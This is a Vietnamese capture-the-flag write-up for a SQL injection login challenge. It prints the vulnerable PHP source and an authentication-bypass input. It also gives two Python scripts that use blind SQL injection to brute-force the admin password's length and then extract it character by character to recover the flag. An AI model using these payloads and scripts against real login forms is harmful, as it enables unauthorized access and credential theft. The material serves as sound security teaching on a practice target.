# Bài 1: Cơ bản về `SQLi`

Problem: `http://ctfq.sweetduet.info:10080/~q6/`

Khi vào đường dẫn cho trong bài thì mình nhận được một form đăng nhập.
![Alt text](images/login.png?raw=true "Basic authen")

OK, Login thì login thôi :D
Có dòng `First, login as "admin"`. Với tính tò mò từ trước giờ thì mình vào trang web nào cũng thử điền dữ liệu không đúng chuẩn, mà cụ thể là điền thêm các ký tự đặc biệt xem form của họ có bị sql injection hay không.

Nên mình quyết định điền:

    * ID: `admin';--`
    * pass: 'cvcncncb'
![Alt text](images/injec1.png?raw=true "Basic authen")
Và submit form thôi, sau khi submit thì nhận được một đống code:

```html
    Congratulations!
    It's too easy?
    Don't worry.
    The flag is admin's password.

    Hint:
    <?php
        function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
        
        $id = isset($_POST['id']) ? $_POST['id'] : '';
        $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
        $login = false;
        $err = '';
        
        if ($id!=='')
        {
            $db = new PDO('sqlite:database.db');
            $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
            $login = $r && $r->fetch();
            if (!$login)
                $err = 'Login Failed';
        }
    ?><!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
    </head>
    <body>
        <?php if (!$login) { ?>
        <p>
        First, login as "admin".
        </p>
        <div style="font-weight:bold; color:red">
        <?php echo h($err); ?>
        </div>
        <form method="POST">
        <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
        <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
        <div><input type="submit"></div>
        </form>
        <?php } else { ?>
        <p>
        Congratulations!<br>
        It's too easy?<br>
        Don't worry.<br>
        The flag is admin's password.<br>
        <br>
        Hint:<br>
        </p>
        <pre><?php echo h(file_get_contents('index.php')); ?></pre>
        <?php } ?>
    </body>
    </html>
```

Ủa, vậy là nó dính lỗi sql injection thật (cuoi2). Nhưng câu chuyện nó khá là phức tạp khi mà đọc đoạn

```txt
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.
```

Vậy là flag chính là password của admin, nhưng khi đọc Hint thì thấy code php bị injection là do nối chuỗi trực tiếp với dữ liệu truyền từ form. Nhưng lại dữ liệu lấy từ database ra thì lại không in ra, mà chỉ là dùng để check câu truy vấn đúng hay không thôi. Nên mình khẳng định đây thuộc dạng SQL Injection mù (Mình sẽ không lể lấy được database ra bằng câu lệnh select bình thường rồi in ra, mà sẽ phải đoán).

Bắt đầu đoán nào:

* Để đoán được password như thế nào thì trước tiên cũng nên biết nó dài bao nhiêu để đoán cho dễ :) Chứ đoán mò khi nào cho hết, vì cứ khi nào đúng thì sẽ được bắn ra một trang hint nên mình inject đoạn sql như vầy `admin' and 10 =  (select LENGTH(pass) from user where id = 'admin');--`.
![Alt text](images/length_pass.png?raw=true "Basic authen")

Chắc chắn là nó login failed rồi :( vì mình đang thử đoán là động dài pass của admin chỉ dài 10. vậy thì chắc chắn độ dài pass không bằng 10. ok, vậy thì thay bằng một số khác 11, 12, 13 ...

Nhưng chợt thấy mình ngu quá, cứ thay rồi bấm submit thế khi nào cho xong :@@

Thế là lại hì học viết một đoạn script check cho lẹ, máy bao giờ nó vẫn nhanh hơn mình mà. Ý tưởng là như vầy: Gửi yêu cầu login gồm ID là đoạn inject mình viết, và pass vớ vẩn. Theo như bên trên lúc inject đúng thì sẽ trả về một hint có code php, trong trang đó sẽ có `Congratulations! ......`. Mình đoán độ dài password nên với câu lệnh `admin' and length_pass =  (select LENGTH(pass) from user where id = 'admin');--` nếu đúng thì sẽ cho ra trang hint, còn không thì vẫn trang login. Và đây là code:

```py
import requests

def length_pass_check():
    url = 'http://ctfq.sweetduet.info:10080/~q6/'

    for i in range(1000):
        sql_inject = "admin\' AND {} = (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') --".format(i)
        form = {
            'id': sql_inject,
            'pass': 'nguyenmanh'
        }
        res = requests.post(url, data=form)
        if res.text.find("Congratulations!") != -1:
            print('Pass chỉ dài {} thôi đại ca ạ!'.format(i))
            break
```

Sau khi chạy thì nhận được kết qủa là `Pass chỉ dài 21 thôi đại ca ạ!`.

Ok, vậy là xác định được độ dài pass là `21`.

Tiếp tục viết hàm để nhặt từng ký tự của `pass` ra nào.
Ý tưởng thì tương tự như bên trên là inject đúng thì sẽ có dòng chữ `Congratulations!`.
Vậy nếu câu lệnh query đúng thì chúng ta sẽ thu được `Congratulations!`. độ dài mật khẩu là 21, kiểm tra từng ký tự một dự vào `string table` python cũng cấp.
Lặp 21 lần cho lớn cho 21 vị trí, trong mỗi vị trí lặp hết `string table` để tìm ký tự đúng.

```py
def leak_pass_easy():
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    str_table = string.printable

    for i in range(1, 22):
        for j in str_table:
            sql_inject = "admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {}, 1) = '{}' --".format(i, j)
            # print(sql_inject)
            form = {
                'id': sql_inject,
                'pass': 'nguyenmanh'
            }
            res = requests.post(url, data=form)
            # print(res.text)
            print("Để em viết Flag ra cho đại ca nhé!")
            if res.text.find("Congratulations!") != -1:
                print(j, end="", flush=True)
                break

```

Chạy xong thì được kết quả `FLAG_KpWa4ji3uZk6TrPKFlag đây là FLAG_KpWa4ji3uZk6TrPK đại ca nhé!`

=> Vậy flag là `FLAG_KpWa4ji3uZk6TrPK`.